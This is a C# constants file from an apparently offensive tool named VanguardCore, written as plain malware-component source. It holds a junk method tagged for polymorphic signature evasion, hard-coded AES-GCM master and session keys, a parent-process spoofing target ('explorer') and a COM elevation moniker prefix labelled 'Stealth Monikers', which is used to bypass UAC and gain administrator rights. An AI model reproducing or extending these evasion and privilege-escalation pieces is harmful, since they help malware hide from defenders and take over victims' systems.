using System;

namespace VanguardCore
{
    public static class Constants
    {
        // [POLY_JUNK]
        private static void _vanguard_d77cf33d() {
            int val = 72351;
            if (val > 50000) Console.WriteLine("Hash:" + 72351);
        }

        // These keys are updated at build time by full_rebuild.ps1
        // AES-GCM Keys (Base64)
        public const string MASTER_KEY_B64 = "VC0zfk8PNijYQIBkiff2prjP0eeo/L9b6CCTc1eU938=";
        public const string ENCRYPTED_SESSION_KEY_B64 = "yF5xt/Py6RdirQ9aoLLtDNZUfPEN3zydF3xtNWy/5JM=";
        
        // Target process name for PPID spoofing
        public const string SPOOF_PARENT = "explorer";
        
        // Stealth Monikers
        public const string MONIKER_PREFIX = "Elevation:Administrator!new:";
    }
}














